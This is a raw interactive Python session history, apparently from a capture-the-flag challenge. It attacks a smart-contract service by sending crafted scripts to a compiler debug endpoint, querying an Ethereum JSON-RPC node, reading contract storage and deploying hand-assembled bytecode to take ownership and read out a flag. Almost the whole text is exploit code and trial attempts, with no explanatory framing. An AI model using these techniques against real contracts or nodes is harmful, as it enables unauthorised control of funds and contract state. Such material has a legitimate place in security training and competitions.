# coding: utf-8
def runscript(script):
    req = {
        'script': script,
        'debug': True
    }
    return requests.post('http://35.207.136.0/execute', json=req).text
def getdebug(script):
    return json.loads(runscript(script))['generated_code']
import json
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
w = x + xx''')
import requests
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
w = x + xx''')
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
zzz = 15
w = x + x''')
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
zzz = 15
zzzz = 16
w = x + x''')
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
zzz = 15
zzzz = 16
zzzzz = 17
w = x + x''')
def buildreq(method, params):
    return {
        'jsonrpc': '2.0',
        'method': method,
        'params': params,
        'id': 0
    }
req = buildreq('eth_getTransactionByBlockNumberAndIndex', ['0x4', '0x0'])
doreq(req).text
def doreq(req):
    global bank
    res = requests.post(api + bank, json=req)
    return res
doreq(req).text
api = 'http://35.207.136.0/eth/'
doreq(req).text
bank = 'f0d25307850cccc1a747fe62b5f2bea1'
req = buildreq('eth_getTransactionByBlockNumberAndIndex', ['0x4', '0x0'])
doreq(req).text
doreq(req).text
owner = '0x03f46475c4b79986cb9e618ec7f79c2f326cbec0'
len(owner)
def isowner(addr):
    req = buildreq('eth_call', [{'from': getcoinbase(), 'data': "0x2f54bf6e000000000000000000000000" + hex(int(addr, 16))[2:].strip('L').rjust(0x20, '0'), 'to':address}])
    return doreq(req).text
isowner(owner)
def isowner(addr):
    req = buildreq('eth_call', [{'from': getcoinbase(), 'data': "0x2f54bf6e000000000000000000000000" + hex(int(addr, 16))[2:].strip('L').rjust(0x20, '0'), 'to':address}])
    print req
    return doreq(req).text
def getcoinbase():
    global bank
    req = {
        'jsonrpc': '2.0',
        'method': 'eth_coinbase',
        'params': [],
        'id': 0
    }
    return json.loads(doreq(req).text)['result']
isowner(owner)
address = '0x4836D27fC5397854Db3eEc3BefEAb299cA19338f'
isowner(owner)
len('0x2f54bf6e0000000000000000000000003f46475c4b79986cb9e618ec7f79c2f326cbec0')
len("0x2f54bf6e000000000000000000000000")
0x20
hex(int(owner, 16))[2:].strip('L').rjust(0x20, '0')
len(hex(int(owner, 16))[2:].strip('L').rjust(0x20, '0'))
def isowner(addr):
    req = buildreq('eth_call', [{'from': getcoinbase(), 'data': "0x2f54bf6e000000000000000000000000" + hex(int(addr, 16))[2:].strip('L').rjust(40, '0'), 'to':address}])
    print req
    return doreq(req).text
isowner(owner)
isowner(100)
isowner('0x64')
isowner(owner)
isowner(owner)
bank = 'aef7b8f575b0f13ba1bca59f434d980a'
isowner(owner)
isowner('0x64')
0x64
isowner('0x63')
isowner('0x65')
getcoinbase
getcoinbase()
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
zzz = 1
zzzz = 0xadd0
setBalance(zzz, x)''')
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
zzz = 1
zzzz = 44496
setBalance(zzz, x)''')
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zz = 14
zzz = 1
zzzz = 44496
setBalance(x, zzz)''')
print getdebug('''
x = 1
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zzz = 1
zzzz = 44496
setBalance(x, zzz)''')
print getdebug('''
x = 100
xx = 2
xxx = 3
xxxx = 4
xxxxx = 5
xxxxxx = 6
y = 7
yy = 8
yyy = 9
yyyy = 10
yyyyy = 11
yyyyyy = 12
z = 13
zzz = 1
zzzz = 44496
setBalance(x, zzz)''')
getcoinbase()
len('0x544e3941ef92d6b2da1335afb8b203b1706bdea9')
'03f46475c4b79986cb9e618ec7f79c2f326cbec0'[:16]
len('03f46475c4b79986cb9e618ec7f79c2f326cbec0'])
len('03f46475c4b79986cb9e618ec7f79c2f326cbec0')
'03f46475c4b79986cb9e618ec7f79c2f326cbec0'[-32:]
req = {'jsonrpc': '2.0',
    'method': 'eth_getStorageAt',
    'params': [address, 0xef07f73f242eea04b293a49653ce3bd856a7473aa77421cdfaa5f709b8776c09, 'latest'],
    'id': 0
  };
bank = 'c976ad6b856f9dfc3cfaa7c60a19f330'
doreq(req).text
owner
isowner(owner)
req = {'jsonrpc': '2.0',
    'method': 'eth_getStorageAt',
    'params': [address, '0xef07f73f242eea04b293a49653ce3bd856a7473aa77421cdfaa5f709b8776c09', 'latest'],
    'id': 0
  };
doreq(req).text
coinbase
getcoinbase()
0xdd9761221d8fa474c931f8ef56f1e6dfbae6d8ad8b0a4e4aabcc23642b03a5d4
len(0xdd9761221d8fa474c931f8ef56f1e6dfbae6d8ad8b0a4e4aabcc23642b03a5d4)
0xdd9761221d8fa474c931f8ef56f1e6dfbae6d8ad8b0a4e4aabcc23642b03a5d4 / 2**256
0xdd9761221d8fa474c931f8ef56f1e6dfbae6d8ad8b0a4e4aabcc23642b03a5d4 < 2**256
bank = 'fc910a58d76e9ebc0271ece7cc453bba'
isowner(getcoinbase())
req = {
	"jsonrpc" : "2.0",
	"method" : "eth_sendTransaction",
	"params" : [{
			"from" : coinbase,
			"data" : "528381815181526020019150805190602001908083836000831461009a575b80518252602083111561009a57602082019150602081019050602083039250610076565b505050905090810190601f1680156100c65780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6100dc610119565b604060405190810160405280600381526020017f486921000000000000000000000000000000000000000000000000000000000081525090505b90565b6020604051908101604052806000815250905600a165627a7a72305820ed71008611bb64338581c5758f96e31ac3b0c57e1d8de028b72f0b8173ff93a10029",
'gas':1000000
		}
	],
	"id" : 1
}
req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '6080604052348015600f57600080fd5b5060b28061001e6000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063dffeadd0146044575b600080fd5b348015604f57600080fd5b5060566058565b005b7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c560405160405180910390a15600a165627a7a723058203ba918a51ba7ca05363dbf4d20461fe4f42e8e04abb9c74ebe4170c6762dcd4b0029'}])
doreq(req).text
req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '6080604052348015600f57600080fd5b5060b28061001e6000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063dffeadd0146044575b600080fd5b348015604f57600080fd5b5060566058565b005b7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c560405160405180910390a15600a165627a7a723058203ba918a51ba7ca05363dbf4d20461fe4f42e8e04abb9c74ebe4170c6762dcd4b0029', 'gas':1000000}])
doreq(req).text
def deploy(data):
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data':data,'gas':1000000}])
    return doreq(req).text
final = '0x1e99383311dc65a57ad5cd7fb36bd872fdd500b74ca16e00ceb9301aa031fc69'
def shit():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': "0x4b8fcc14000000000000000000000000" + '1e99383311dc65a57ad5cd7fb36bd872fdd500b74ca16e00ceb9301aa031fc69', 'to':address}])
    return doreq(req).text
shit()
req = {'jsonrpc': '2.0',
    'method': 'eth_getLogs',
    'params': [
      {
        'fromBlock': '0x0',
        'toBlock': 'latest'
      }
    ],
    'id': 0
  };
doreq(req).text
def tranresult(hash):
    req = buildreq('eth_getTransactionReceipt', [hash])
    return doreq(req).text
tranresult('0xaba6aa0c3bd1c1e5112b1d84d96592d503d5d9623b883a7aa5666a2bb5776b63')
isowner(getcoinbase())
req = buildreq('eth_blockNumber', [])
doreq(req).text
deploy('7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a100')
deploy('7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a100')
bank = '40c71554ffe55eead58fb4ac8e91a06d'
deploy('7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a100')
final = '0x70efdb18411f2cbae59e75b66afff019127a2853c117bad767b183b42f9ce64c'
def shit2():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '', 'to':final}])
    return doreq(req).text
shit2()
def shit2():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '\x00'*20, 'to':final}])
    return doreq(req).text
shit2()
def shit2():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '00'*20, 'to':final}])
    return doreq(req).text
shit2()
def shit2():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '0x'+'0'*20, 'to':final}])
    return doreq(req).text
shit2()
def shit2():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '0x'+'0'*40, 'to':final}])
    return doreq(req).text
shit2()
def shit2():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': '0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675', 'to':final}])
    return doreq(req).text
shit2()
def shit2():
    req = buildreq('eth_call', [{'from': getcoinbase(), 'data': '0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675', 'to':final}])
    return doreq(req).text
shit2()
final
len(final)
len('0x1e99383311dc65a57ad5cd7fb36bd872fdd500b74ca16e00ceb9301aa031fc69')
len('1e99383311dc65a57ad5cd7fb36bd872fdd500b74ca16e00ceb9301aa031fc69')
address
deploy('6080604052348015600f57600080fd5b5060ab8061001e6000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063dffeadd0146044575b600080fd5b348015604f57600080fd5b5060566058565b005b7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a15600a165627a7a72305820436270bacf4f60749ea4269f99a7415f1d4de0ea5e63a465cb32f669a59f31310029')
def getcode(addr):
    req = buildreq('eth_getCode', [addr, 'latest'])
    return doreq(req).text
getcode('0x53c3b1a4665471b67e27b54f29a2a6c6f223313210cbdff81e127b915680e012')
getcode(address)
address
final
tranresult(final)
getcode('0x10b423e3886814acf60f8e330874bdecdd32e07b')
tranresult('0x53c3b1a4665471b67e27b54f29a2a6c6f223313210cbdff81e127b915680e012')
deploy('6300000029601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a10060006000f3')
bank = '7ed573cee7183b9b216351f13d6547a2'
deploy('6300000029601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a10060006000f3')
tranresult('0xf1b07bb7d9e766a5ca970bc58257fc13e63a1fe09a7292c5f58397d3ff9f0072')
getcode('0x10b423e3886814acf60f8e330874bdecdd32e07b')
final = '0x7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a100600060'
shit2()
final = '0x10b423e3886814acf60f8e330874bdecdd32e07b'
shit2()
deploy('6300000029601460003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
tranresult('0x54a13dbceb18b2bd6ed8e428d34f974715dd0b2e4964c3567ed870e2b35ceb25')
getcode('0x48042b29966c50cfe9dcc6992dc4b9463b4b741b')
deploy('63000000230601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
deploy('6300000030601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
tranresult('0x13a5e75ea6bcc0733020c6ec040138123ead5f276bd498aad0bb406c6e4bfadd')
getcode('0x534631b03f4c380ff6b76eb242f584af5c83beaf')
deploy('6300000031601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
tranresult('0xc9980017ec3f8256a9a019dae489ef8d5eac7e8cd56ab899e8aeca820b1d5aac')
getcode('0x0086c94cdc757b949424659ef4690cd20709d408')
deploy('6300000032601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
tranresult('0x2ce3f21684fc9f4aa9d63dc6c88991d8520cc4ddc0e6f1943df5dd2e94025f2a')
getcode('0x85dcb36414b9c78709c85ef906f3b0b33822f1a5')
len('7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
len('7fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')/2
hex(42)
deploy('630000002a601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f3')
tranresult('0x14117175d046808724d08ffba5e1b573ae3a729e11ba8c66b1e853a2ab5bfb44')
getcode('0x4370ed3dc93cecf4a007f20e39d11117fe1a33ed')
deploy('630000002b601260003963000000296000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f300')
tranresult('0x648e1191f749c0102e67679022842e7202e1a719c3991a5ffe90bdfab4ea1a11')
getcode('0xf0a8e75649b1f52debea00a3e80f35c10ee2881d')
deploy('6300000028601260003963000000286000f3600160026003600460056006600760086009600a600b600c600d600e600f60108f900160006000f3')
bank = '5b4af5e706ff630d039d02f80e5db152'
deploy('6300000028601260003963000000286000f3600160026003600460056006600760086009600a600b600c600d600e600f60108f900160006000f3')
tranresult('0x67e774c6918ccdb3e1e4b25c42423028ed3447e677978ba69d6aa318c09b1f63')
getcode('0x10b423e3886814acf60f8e330874bdecdd32e07b')
deploy('630000002b6012600039630000002b6000f37fa167172562add270a4b89c49b58bcae0b13d3206fca06345a091d6ec738878c5600080a160006000f300')
tranresult('0x717b157486dde94ecaa9067f78a8fd4e34b79788cb0cd96a9f49a6997f3ec5a6')
getcode('0x48042b29966c50cfe9dcc6992dc4b9463b4b741b')
final = '0x48042b29966c50cfe9dcc6992dc4b9463b4b741b'
shit2()
req = {'jsonrpc': '2.0',
    'method': 'eth_getLogs',
    'params': [
      {
        'fromBlock': '0x0',
        'toBlock': 'latest'
      }
    ],
    'id': 0
  };
doreq(req).text
def shit():
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': "0x4b8fcc14000000000000000000000000" + hex(int(final, 16))[2:].strip('L').rjust(40, '0'), 'to':address}])
    return doreq(req).text
shit()
req = buildreq('eth_getTransactionByBlockNumberAndIndex', ['0x4', '0x0'])
doreq(req).text
req = buildreq('eth_getBlockTransactionCountByNumber', ['0x1'])
req = buildreq('eth_blockNumber', [])
doreq(req).text
req = buildreq('eth_getTransactionByBlockNumberAndIndex', ['0x7', '0x0'])
doreq(req).text
len('7a11c113d840ac518da9099b2fa7000ed13b5184')
final
len(final)
def shit():
    assert len(final) == 42
    req = buildreq('eth_sendTransaction', [{'from': getcoinbase(), 'data': "0x4b8fcc14000000000000000000000000" + final[2:], 'to':address}])
    return doreq(req).text
isowner(getcoinbase())
shit()
req = {'jsonrpc': '2.0',
    'method': 'eth_getStorageAt',
    'params': [address, '0x64', 'latest'],
    'id': 0
  };
doreq(req).text
req = {'jsonrpc': '2.0',
    'method': 'eth_getStorageAt',
    'params': [address, '0x65', 'latest'],
    'id': 0
  };
doreq(req).text
flag = '333543335f746869735f636f64655f7761735f666f726d616c6c795f70726f76656e2e2e2e5f746f5f7375636b21'
flag.decode('hex')
